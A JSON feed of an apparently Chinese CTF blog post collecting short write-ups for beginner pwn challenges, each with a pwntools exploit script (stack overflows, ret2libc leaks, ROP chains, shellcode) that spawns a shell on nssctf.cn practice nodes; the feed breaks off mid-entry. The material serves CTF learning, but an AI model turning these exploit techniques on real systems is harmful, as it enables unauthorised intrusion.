{
    "version": "https://jsonfeed.org/version/1",
    "title": "ililiiY • All posts by \"pwn\" category",
    "description": "承蒙的是希望 做出你想做的",
    "home_page_url": "https://lookhui.github.io",
    "items": [
        {
            "id": "https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/",
            "url": "https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/",
            "title": "PWN刷题解析",
            "date_published": "2023-12-13T00:46:10.000Z",
            "content_html": "<h5 id=\"swpuctf-2021-新生赛gift_pwn\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛gift_pwn\">#</a> [SWPUCTF 2021 新生赛] gift_pwn</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28785)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x4005B6)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2019华北pwn1\"><a class=\"anchor\" href=\"#ciscn-2019华北pwn1\">#</a> [CISCN 2019 华北] PWN1</h5>\n<p>这个题直接覆盖掉 v1 让其溢出后直接到 return</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28536)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x30+0x8)+p64(0x4006BE)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>当然也能让 v1 溢出使 v2 等于那个让其执行 return<br />\ntips:11.28125 表示在内存存储就是 0x41348000</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">xianyufen=remote(&quot;node1.anna.nssctf.cn&quot;,28029)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x2C+p64(0x41348000)</span><br><span class=\"line\">xianyufen.send(payload)</span><br><span class=\"line\">xianyufen.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babystack20\"><a class=\"anchor\" href=\"#bjdctf-2020babystack20\">#</a> [BJDCTF 2020]babystack2.0</h5>\n<p>这个题判断点在于无符号类型因为里面的<br />\n <code>if ( (int)nbytes &gt; 10 ) </code> read(0, buf, (unsigned int)nbytes);<br />\n 因为 buf 的溢出要 0x18 但是 nbytes 只能是 &lt; 10 所以我们就要使用无符号类型让它等于 - 1 然后就能读取很多产生溢出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28867)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x400726)</span><br><span class=\"line\">p.sendlineafter(&#x27;name:&#x27;,&#x27;-1&#x27;)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022reorpwn\"><a class=\"anchor\" href=\"#nisactf-2022reorpwn\">#</a> [NISACTF 2022]ReorPwn?</h5>\n<p>这个题注意他的 fun 函数里面给你的顺序逆了一下，下面就是 system，那直接使用 payload 数组逆位一下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28301)</span><br><span class=\"line\">comm=&#x27;cat /flag&#x27;</span><br><span class=\"line\">a=comm[::-1]</span><br><span class=\"line\">p.sendlineafter(&#x27;lleT:&#x27;,a)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babystack\"><a class=\"anchor\" href=\"#bjdctf-2020babystack\">#</a> [BJDCTF 2020]babystack</h5>\n<p>这个题就更简单了，像前面那个题，这个题还不需要判断 read 的长度随便输就行能达到溢出点就行</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28240)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x4006E6)</span><br><span class=\"line\">p.sendlineafter(&#x27;name:&#x27;,&#x27;-1&#x27;)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022ezstack\"><a class=\"anchor\" href=\"#nisactf-2022ezstack\">#</a> [NISACTF 2022]ezstack</h5>\n<p>打开后用 ida 查看到代码里面没有 system ('/bin/sh') 但是有 system 并且在 data 段里面有 /bin/sh 那我们直接让代码溢出调用 system 和 /bin/sh</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28961)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x48+0x4)+p32(0x08048512)+p32(0x804A024)</span><br><span class=\"line\">p.sendlineafter(&#x27;NISACTF&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"watevrctf-2019voting-machine-1\"><a class=\"anchor\" href=\"#watevrctf-2019voting-machine-1\">#</a> [watevrCTF 2019]Voting Machine 1</h5>\n<p>这个题有两个解法，输入 0x2 或者 0xa</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>machine</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28788)</span><br><span class=\"line\">#p=process(&#x27;./ctf&#x27;)</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0xa)+p64(0x400807)</span><br><span class=\"line\">p.sendlineafter(&quot;Vote:&quot;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022ezpie\"><a class=\"anchor\" href=\"#nisactf-2022ezpie\">#</a> [NISACTF 2022]ezpie</h5>\n<p>这种题要注意流程化，先看因为开启了 pie 地址随机化就得去算他们的偏移量因为得到了 main 函数地址所以就直接构造</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28694)</span><br><span class=\"line\">elf=ELF(&#x27;./pw&#x27;)</span><br><span class=\"line\">shell=elf.sym[&#x27;shell&#x27;]</span><br><span class=\"line\">main=elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\">offset=shell-main</span><br><span class=\"line\">log.info(&#x27;offset is :%x&#x27;%offset)</span><br><span class=\"line\">p.recvuntil(&#x27;gift!\\n&#x27;)</span><br><span class=\"line\">main_addr=int(p.recv(10).decode(),16)</span><br><span class=\"line\">p_shell_addr=main_addr+offset</span><br><span class=\"line\">log.info(&#x27;main_addr is %x&#x27;%main_addr)</span><br><span class=\"line\">log.info(&#x27;shelloffset is %x&#x27;%p_shell_addr)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x28+0x4)+p32(p_shell_addr)</span><br><span class=\"line\">p.sendlineafter(&#x27;Input:&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"2021-鹤城杯babyof\"><a class=\"anchor\" href=\"#2021-鹤城杯babyof\">#</a> [2021 鹤城杯] babyof</h5>\n<p>这个题是一个 ret2libc 的题首先要泄露出一个 libc 基地址然后才能得到其他的地址</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">program = &quot;./babyof&quot;</span><br><span class=\"line\">p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28666)#process(program)</span><br><span class=\"line\">elf = ELF(program)</span><br><span class=\"line\">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">puts_got = elf.got[&quot;puts&quot;]</span><br><span class=\"line\">pop_rdi = 0x400743</span><br><span class=\"line\">pop_ret = 0x400506</span><br><span class=\"line\">__start = 0x400550</span><br><span class=\"line\">payload = b&#x27;a&#x27;*(0x40+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) #//跳转到rdi寄存器上面然后在通过puts函数来打印puts的got在通过ret到起始位置让下面的payload生效</span><br><span class=\"line\">p.sendlineafter(&quot;Do you know how to do buffer overflow?\\n&quot;,payload)</span><br><span class=\"line\">p.recvuntil(&quot;I hope you win\\n&quot;)</span><br><span class=\"line\">puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))  #\\\\接收puts的got地址因为栈地址一般是由\\x7f开头的自动补全8位</span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr) #\\\\利用puts_addr在LibcSearcher里面查找对映的库</span><br><span class=\"line\">libc_addr = puts_addr-libc.dump(&#x27;puts&#x27;)  #\\\\利用puts_addr（动态地址）减去puts的函数偏移量即可得到libc的基地址</span><br><span class=\"line\">bin_sh_str=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;) #\\\\下面的得到基地址后都加上偏移量就能得到对应的函数了</span><br><span class=\"line\">system=libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\">log.info(&#x27;libc addr is %x&#x27;%libc_addr)</span><br><span class=\"line\">log.info(&#x27;bin_sh_str is %x&#x27;%bin_sh_str)</span><br><span class=\"line\">payload2 = b&#x27;a&#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) #\\\\使用一个ret来跳转到pop_rdi然后就利用system(/bin/sh)即可</span><br><span class=\"line\">p.sendlineafter(&quot;Do you know how to do buffer overflow?\\n&quot;,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gfctf-2021where_is_shell\"><a class=\"anchor\" href=\"#gfctf-2021where_is_shell\">#</a> [GFCTF 2021]where_is_shell</h5>\n<p>可以利用 system ($0) 获得 shell 权限，$0 在机器码中为 \\x24\\x30</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">elf = ELF(&#x27;./shell&#x27;)</span><br><span class=\"line\">local = 1</span><br><span class=\"line\">if local ==0:</span><br><span class=\"line\"> p = process(&#x27;./shell&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\"> p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28616)</span><br><span class=\"line\">ret_addr = 0x400416 # ROPgadget --binary shell --only &#x27;ret&#x27;</span><br><span class=\"line\">pop_rdi_ret = 0x4005e3 # ROPgadget --binary shell --only &#x27;pop|rdi|ret&#x27;</span><br><span class=\"line\">tips = 0x400541</span><br><span class=\"line\">system_addr = elf.symbols[&#x27;system&#x27;]</span><br><span class=\"line\">payload = b&#x27;b&#x27;*0x10+b&#x27;b&#x27;*8+p64(ret_addr)+p64(pop_rdi_ret)+p64(tips)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(&#x27;find it?\\n&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2021-新生赛whitegive_pwn\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛whitegive_pwn\">#</a> [SWPUCTF 2021 新生赛] whitegive_pwn</h5>\n<p>这个题的话和 babyof 的题差不多就是一个 ret2libc 的题但是这个题的 libc.so 有问题打不进去代码如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">program = &quot;./Desktop/附件&quot;</span><br><span class=\"line\">p = remote(&#x27;node5.anna.nssctf.cn&#x27;,28406)#process(program)</span><br><span class=\"line\">elf = ELF(program)</span><br><span class=\"line\">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">puts_got = elf.got[&quot;puts&quot;]</span><br><span class=\"line\">pop_rdi = 0x400763</span><br><span class=\"line\">pop_ret = 0x400509</span><br><span class=\"line\">__start = 0x400570</span><br><span class=\"line\">payload = b&#x27;a&#x27;*(0x10+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) </span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))  #\\\\接收puts的got地址因为栈地址一般是由\\x7f开头的自动补全8位</span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr) #\\\\利用puts_addr在LibcSearcher里面查找对映的库</span><br><span class=\"line\">libc_addr = puts_addr-libc.dump(&#x27;puts&#x27;)  #\\\\利用puts_addr（动态地址）减去puts的函数偏移量即可得到libc的基地址</span><br><span class=\"line\">bin_sh_str=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;) #\\\\下面的得到基地址后都加上偏移量就能得到对应的函数了</span><br><span class=\"line\">system=libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\">log.info(&#x27;libc addr is %x&#x27;%libc_addr)</span><br><span class=\"line\">log.info(&#x27;bin_sh_str is %x&#x27;%bin_sh_str)</span><br><span class=\"line\">payload2 = b&#x27;a&#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) #\\\\使用一个ret来跳转到pop_rdi然后就利用system(/bin/sh)即可</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>还有个大佬用的裸 so 打进去的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#p = process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">p = remote(&#x27;node5.anna.nssctf.cn&#x27;,28820)</span><br><span class=\"line\">elf = ELF(&#x27;./pw&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def debug():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\">def get_addr():</span><br><span class=\"line\">\treturn u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">rdi = 0x400763</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x18 + p64(rdi) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;vuln&#x27;])</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = get_addr() - 0x06f6a0</span><br><span class=\"line\">system = libc_base + 0x0453a0</span><br><span class=\"line\">binsh = libc_base + 0x18ce57</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x18 + p64(rdi) + p64(binsh) + p64(system) </span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2019东北pwn2\"><a class=\"anchor\" href=\"#ciscn-2019东北pwn2\">#</a> [CISCN 2019 东北] PWN2</h5>\n<p>这又是个 ret2libc 的体型直接打</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&quot;./pwn2&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28652)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">start=0x400790</span><br><span class=\"line\"></span><br><span class=\"line\">ret=0x4006b9</span><br><span class=\"line\"></span><br><span class=\"line\">rdi_ret=0x400c83</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x58+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;choice!&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;encrypted&#x27;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr=libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">str_bin_sh=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=b&#x27;a&#x27;*0x58+p64(ret)+p64(rdi_ret)+p64(str_bin_sh)+p64(system_addr)+p64(start)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;choice!&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;encrypted&#x27;,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"wustctf-2020getshell\"><a class=\"anchor\" href=\"#wustctf-2020getshell\">#</a> [WUSTCTF 2020]getshell</h5>\n<p>这个拿到 flag 后交不了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28667)</span><br><span class=\"line\">system_addr=0x804851B</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x18+0x4)+p32(system_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gdouctf-2023easy-pwn\"><a class=\"anchor\" href=\"#gdouctf-2023easy-pwn\">#</a> [GDOUCTF 2023]EASY PWN</h5>\n<p>本地运行发现多输入几位发现提示没有 flag.txt 可以猜到直接 nc 连接多输入几位即可得到 flag，虽然得到了 flag 但是还是要分析一下这个程序，使用 checksec 后可以查看这个开启了地址随机化那打开 ida 发现这个 main 调用 check 然后在调用 printflag，然后我们还是写个脚本</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>pwn</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28563)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*50</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ret2shellcode\"><a class=\"anchor\" href=\"#hnctf-2022-week1ret2shellcode\">#</a> [HNCTF 2022 Week1]ret2shellcode</h5>\n<p>这个题要注意 c 语言的几个函数 memset、strcpy、mprotect 其中 mprotect 是赋权限 strcpy 是复制然后 memset 是设置前面的字符替换为指定字符<br />\n按照题目标题的话我们直接写入 shellcode 造成溢出然后在调用 buff 函数即可，因为 shellcode 写入的话 strcpy 将我们写入的 shellcode 写入到了 buff 字段<br />\n buff 字段可以直接去.bss 查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28457)</span><br><span class=\"line\">shellcode=asm(shellcraft.sh())</span><br><span class=\"line\">payload=shellcode.ljust(0x108,b&#x27;a&#x27;)+p64(0x4040A0)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"2021-鹤城杯littleof\"><a class=\"anchor\" href=\"#2021-鹤城杯littleof\">#</a> [2021 鹤城杯] littleof</h5>\n<p>注意 canary 保护绕过方法注意使用方法 nssctf 上的环境有问题我的 poc 打不进去只有用这个</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 